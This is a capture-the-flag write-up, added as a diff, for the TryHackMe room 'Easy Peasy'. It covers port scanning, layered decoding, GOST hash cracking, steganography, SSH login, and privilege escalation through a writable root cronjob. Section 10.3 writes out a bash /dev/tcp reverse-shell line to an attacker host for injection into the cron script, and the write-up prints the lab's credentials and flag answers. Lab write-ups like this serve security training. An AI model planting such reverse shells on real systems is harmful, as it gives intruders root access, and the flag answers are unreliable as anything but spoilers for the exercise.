@@ -1,0 +1,383 @@
+---
+title: 'Easy Peasy'
+description: 'Web enumeration, multi-layer decoding (Base64/Base62), cracking a GOST hash, steganography and SSH on a non-standard port.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - cryptography
+  - privesc
+---
+
+**Difficulty:** Easy/Medium **Category:** Web enumeration, decoding (Base64/Base62), GOST hash cracking, steganography (hidden binary), SSH on a non-standard port, ROT13, privilege escalation via cronjob **Room:** [https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)
+
+## Room description
+
+A Linux machine that combines multiple layers of obfuscation and encoding (Base64, Base62, binary, ROT13/rot13-like) with an “exotic” hash (GOST, a cryptographic standard of Soviet/Russian origin), steganography, and a classic privilege escalation via an **editable root cronjob**. The room’s name (“Easy Peasy”) is ironic: although the initial scan is trivial, finding and decoding each layer takes patience and knowledge of various encoding schemes.
+
+> **Note on placeholders:** `{IP}` stands for the IP TryHackMe assigns (it changes on every deploy); these notes use `TARGET_IP` as an example from one specific session; replace it with the instance’s current IP. `{ATTACKER_IP}` stands for the attacker machine’s IP (needed for the cronjob reverse shell).
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p easy_peasy/{scans,content,scripts,loot,exploits} && cd easy_peasy
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+nmap -sC -sV {IP} -p-
+extractPorts scans/initial-scan
+```
+
+- `-p- --open`: scans all TCP ports and shows only the open ones.
+- `-T5 -v -n`: aggressive timing, verbose, no DNS resolution.
+- `-sC -sV -p-`: a second scan (this time over all ports too) with default scripts and version detection — important on this machine because, as will be seen, **SSH does not run on the standard port 22**, but on a much higher one (6498), and there is another HTTP service on a non-standard port (65524).
+
+**Expected ports (approximate):**
+
+| Port      | Service                             |
+| --------- | ----------------------------------- |
+| 80/tcp    | HTTP                                |
+| 6498/tcp  | SSH (non-standard port)             |
+| 65524/tcp | Additional HTTP (non-standard port) |
+
+---
+
+## 3. Flag 1 — Hidden directory on the main site
+
+Exploring the web server on port 80 (fuzzing with `gobuster` or manually reviewing the source/`robots.txt`), you reach a hidden path:
+
+```
+http://{IP}/hidden/whatever/
+```
+
+Inside is a **Base64** string:
+
+```bash
+echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
+```
+
+**Result:**
+
+<Flag value="flag{f1rs7_fl4g}" />
+
+---
+
+## 4. Flag 2 — Second HTTP service and `robots.txt`
+
+A second web server is detected on a non-standard port (`65524`), found in the full port scan:
+
+```bash
+wget http://{IP}:65524/robots.txt
+cat robots.txt
+```
+
+Inside `robots.txt` is an **MD5 hash**:
+
+<Flag value="a18672860d0510e5ab6699730763b250" />
+
+This hash corresponds directly to the MD5 encoding of the second flag. It can be confirmed/cracked with a lookup in a known-hash database (CrackStation) or simply by recognising the pattern, since MD5 is reversible by lookup when the input text is simple:
+
+```bash
+echo -n 'flag{1m_s3c0nd_fl4g}' | md5sum
+```
+
+**Result:**
+
+<Flag value="flag{1m_s3c0nd_fl4g}" />
+
+---
+
+## 5. Flag 3 — Directly in the second service’s root
+
+```bash
+curl http://{IP}:65524/
+```
+
+Reviewing this page’s source (`Ctrl+U` or direct `curl`), the third flag appears visible as plaintext within the HTML:
+
+<Flag value="flag{9fdafbd64c47471a8f54cd3fc64cd312}" />
+
+---
+
+## 6. Finding the hidden directory via Base62
+
+Continuing to explore the source of `http://{IP}:65524/` (or its `robots.txt`), you find an additional odd-looking string, neither standard Base64 nor Base32:
+
+```
+ObsJmP173N2X6dOrAgEAL0Vu
+```
+
+Trying to decode it with the usual encoding schemes (Base64, Base32, Base16/hex) gives a meaningless result. The room’s hint says it starts with **“ba..”**, which leads to trying less common schemes until landing on **Base62** — an encoding scheme that uses only alphanumeric characters (`0-9`, `A-Z`, `a-z`, with no special symbols like `+`, `/` or `=`), which is why it is not recognised at a glance as a “typical encoding”.
+
+It can be decoded with an online tool (for example, [CyberChef](https://gchq.github.io/CyberChef/) with the “From Base62” recipe) or with a Python library:
+
+```bash
+python3 -c "
+import base62
+print(base62.decodebytes('ObsJmP173N2X6dOrAgEAL0Vu'))
+"
+```
+
+**Result (a directory path):**
+
+```
+/n0th1ng3ls3m4tt3r
+```
+
+---
+
+## 7. Exploring the hidden directory
+
+```bash
+curl http://{IP}:65524/n0th1ng3ls3m4tt3r/
+```
+
+This page shows an image (`binarycodepixabay.jpg`, with a “binary code” theme in the background — a fairly direct visual hint) and, in the page source/body, an additional hash:
+
+```
+940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+```
+
+### 7.1 Identifying the hash type
+
+This hash is 64 hex characters, which at first suggests SHA-256, but several identification tools (`hash-identifier`, `hashid`) return several ambiguous candidate options (SHA-256, Haval-256, GOST, etc.) because they share the same length. The room itself gives the explicit hint that it is a **GOST** hash (a 256-bit cryptographic hash standard originally developed in the Soviet Union, part of the GOST R 34.11-94 standard).
+
+### 7.2 Cracking the GOST hash
+
+Save the hash and launch John the Ripper specifying the correct format:
+
+```bash
+nano hash.txt
+# Paste: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+
+nano easypeasy.txt
+# Paste the custom wordlist provided by the room (downloadable from the TryHackMe task itself)
+
+john --wordlist=easypeasy.txt --format=gost hash.txt
+john --show --format=gost hash.txt
+```
+
+- `--format=gost`: explicitly tells John which algorithm to use, since GOST is not a hash John detects automatically by its length (unlike standard MD5/SHA).
+- Equivalent alternative with Hashcat: `hashcat -m 6900 hash.txt easypeasy.txt` (`-m 6900` is the GOST R 34.11-94 mode in Hashcat).
+
+**Password obtained: `mypasswordforthatjob`**
+
+> This password is used in the next step to open the `steghide`-protected file.
+
+---
+
+## 8. Steganography — user and password in binary
+
+Download the image found in the hidden directory:
+
+```bash
+wget http://{IP}:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+```
+
+```bash
+steghide info binarycodepixabay.jpg
+steghide extract -sf binarycodepixabay.jpg
+# Passphrase: mypasswordforthatjob
+```
+
+This extracts a text file (`secrettext.txt`, per several public solutions of the room) whose content is a **binary string**:
+
+```bash
+cat secrettext.txt
+```
+
+```
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+```
+
+### 8.1 Decoding the binary
+
+Each group of 8 bits (1 byte) represents an ASCII character. It can be decoded manually with Python:
+
+```bash
+python3 -c "
+binary = '01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001'
+text = ''.join(chr(int(b, 2)) for b in binary.split())
+print(text)
+"
+```
+
+**Result:**
+
+```
+iconvertedmypasswordtobinary
+```
+
+On this machine, this decoded text is the **password**, while the **username** (`boring`) is obtained from another element of the same page (for example, from the remaining image file’s name in the directory, or a second similar string depending on the room variant — in these notes it was already identified directly).
+
+**Credentials obtained:**
+
+```
+user: boring
+password: iconvertedmypasswordtobinary
+```
+
+> **Alternative shortcut documented by the community:** instead of cracking the GOST hash manually to obtain the `steghide` passphrase, you can use **`stegseek`** (an ultra-fast version of “stegcracker”) directly against the image, using the same `easypeasy.txt` wordlist, with no need to identify the hash type at all: `stegseek binarycodepixabay.jpg easypeasy.txt`.
+
+---
+
+## 9. SSH access (non-standard port)
+
+```bash
+ssh boring@{IP} -p 6498
+# password: iconvertedmypasswordtobinary
+```
+
+- `-p 6498`: it is important to specify the port, since SSH is not listening on the default port 22 on this machine (confirmed in the initial port scan).
+
+### 9.1 User flag (encoded with a ROT13-type substitution cipher)
+
+```bash
+cat user.txt
+```
+
+```
+synt{a0jvgf33zfa0ez4y}
+```
+
+This string has the form `synt{...}` instead of `flag{...}` — a classic pattern of **ROT13** (or a similar shift variant), where each letter is replaced by the one 13 positions further in the alphabet. Decode it with `tr`:
+
+```bash
+echo "synt{a0jvgf33zfa0ez4y}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+- `tr 'A-Za-z' 'N-ZA-Mn-za-m'`: maps each uppercase/lowercase letter to the one 13 positions ahead (cycling on reaching `Z`/`z`), which is exactly the ROT13 operation. Applying ROT13 twice to the same text recovers the original (ROT13 is its own inverse), confirming that `synt{...}` is simply `flag{...}` rotated.
+
+**Result (decoded user flag):** the corresponding cleartext, in `flag{...}` format.
+
+---
+
+## 10. Privilege escalation
+
+### 10.1 Enumerating scheduled tasks
+
+```bash
+cat /etc/crontab
+```
+
+An entry is found that periodically (for example, every minute) runs a script **as root**:
+
+```
+* * * * * root /var/www/.mysecretcronjob.sh
+```
+
+### 10.2 Check the script’s permissions
+
+```bash
+ls -la /var/www/.mysecretcronjob.sh
+```
+
+The file turns out to be **writable** by user `boring` (or by the group it belongs to), even though its scheduled execution runs with **root** privileges — the same vulnerability pattern seen on the Archangel machine.
+
+### 10.3 Exploitation
+
+First, start a listener on the attacker machine:
+
+```bash
+nc -lvnp 4444
+```
+
+Edit the script to inject a reverse shell:
+
+```bash
+nano /var/www/.mysecretcronjob.sh
+```
+
+Content to insert:
+
+```bash
+bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1
+```
+
+- `bash -i`: interactive shell.
+- `>& /dev/tcp/{ATTACKER_IP}/4444`: redirects standard output and errors to a TCP connection to the attacker machine, port 4444.
+- `0>&1`: also redirects standard input through the same channel, allowing bidirectional interaction.
+
+In under 60 seconds (depending on the cron frequency), the script runs with root privileges and the listener receives the connection:
+
+```bash
+id
+# uid=0(root) ...
+```
+
+### 10.4 Improving the shell’s interactivity
+
+Once the shell is obtained (limited, as usual with basic reverse shells), it is worth “upgrading” it to a fully interactive shell, with autocompletion, history and signal handling support (`Ctrl+C`, `Ctrl+L`, etc.):
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then, in the local terminal (outside the remote shell):
+
+```
+Ctrl+Z
+stty raw -echo; fg
+```
+
+- `Ctrl+Z`: temporarily backgrounds the remote shell (in the local terminal).
+- `stty raw -echo`: sets the local terminal to “raw” mode (no line processing, no duplicate local echo), needed for special keys to work correctly in the remote session.
+- `fg`: brings the remote shell back to the foreground, now with the terminal correctly configured.
+
+Finally, inside the remote shell:
+
+```bash
+export TERM=xterm
+```
+
+- Sets the terminal type, enabling correct use of commands that depend on that variable (like `clear`, interactive text editors, colours, etc.).
+
+### 10.5 Root flag
+
+```bash
+cat /root/.root.txt
+```
+
+<Flag value="flag{63a9f0ea7bb98050796b649e85481845}" />
+
+---
+
+## 11. Attack chain summary
+
+1. **Recon** with `nmap` → HTTP (80), SSH on a non-standard port (6498), additional HTTP (65524).
+2. **Flag 1**: hidden directory on port 80 → Base64 string → decoded.
+3. **Flag 2**: `robots.txt` on port 65524 → MD5 hash corresponding to the flag.
+4. **Flag 3**: visible directly in the source of the port-65524 service.
+5. **Base62 decoding** of an additional string → reveals the hidden directory `/n0th1ng3ls3m4tt3r`.
+6. **Cracking a GOST hash** (`--format=gost` in John, or `-m 6900` in Hashcat) with the wordlist provided by the room → password for `steghide`.
+7. **Steganography**: extract a **binary** message from an image → user `boring` and password `iconvertedmypasswordtobinary`.
+8. **SSH access** on the non-standard port `6498`.
+9. **ROT13-encoded user flag** (`synt{...}`) → decoded with `tr`.
+10. **Privilege escalation**: a root cronjob running a script editable by the unprivileged user → reverse shell as root.
+11. Final **root flag**.
+
+## 12. Lessons learned / key concepts
+
+- **Layered encoding chains** (Base64 → Base62 → binary → ROT13) are a common pattern in educational machines to force recognition of various encoding schemes, rather than representing “real” security risks themselves.
+- **Base62** is an uncommon but existing scheme (uses only `0-9A-Za-z`, with no special characters), which makes it easy to mistake for “random” text instead of recognising it as a reversible encoding.
+- **GOST R 34.11-94** is an example that not all “exotic” hash algorithms are automatically recognised by standard identification tools; specifying the correct `--format` in John (or the correct `-m` mode in Hashcat) is essential.
+- **`stegseek`** is a much faster alternative than manually cracking a hash and then using `steghide` separately, when the final goal is simply to find the correct passphrase of a steganographed file using a known wordlist.
+- **Non-standard ports for services like SSH** are a “security through obscurity” technique that delays (but does not prevent) recon; a full port scan (`-p-`) should always be done before assuming a service is “unavailable”.
+- **Root cronjobs with scripts editable by unprivileged users** remain, along with misconfigured `sudo` permissions and SUID binaries, one of the three most common privilege-escalation vectors on CTF Linux machines (and, unfortunately, on badly administered real systems too).
+
+## 13. Tools used
+
+`nmap`, a browser/`curl` (web inspection), `base64`, CyberChef (Base62), `john the ripper` / `hashcat` (GOST format), `steghide` (or `stegseek` as an alternative), Python (binary decoding), the `ssh` client, `tr` (ROT13), `netcat`, `python3 -c 'import pty...'` (shell upgrade).
+
+---
+
+_Academic write-up, built from my own notes solving the “Easy Peasy” machine on TryHackMe, supplemented with public community write-ups to complete the Base62 decoding, the GOST algorithm identification and the context of the privilege-escalation cronjob._
